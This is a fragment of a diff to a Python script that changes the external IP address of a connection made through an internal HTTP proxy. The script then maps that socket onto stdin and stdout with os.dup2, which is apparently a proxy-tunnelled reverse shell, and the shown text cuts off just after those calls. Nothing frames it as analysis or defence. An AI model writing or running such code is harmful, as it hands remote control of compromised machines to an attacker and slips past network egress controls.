@@ -70,7 +70,7 @@ def http_proxy_connect(address, proxy = None, auth = None, headers = {}):
   fp.close()
   return (s, status, response_headers)
   
-(s,b,c) = http_proxy_connect (("52.215.9.233", 443), ("172.21.200.40", 3128))
+(s,b,c) = http_proxy_connect (("34.251.37.26", 443), ("172.21.200.40", 3128))
 print b,c
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
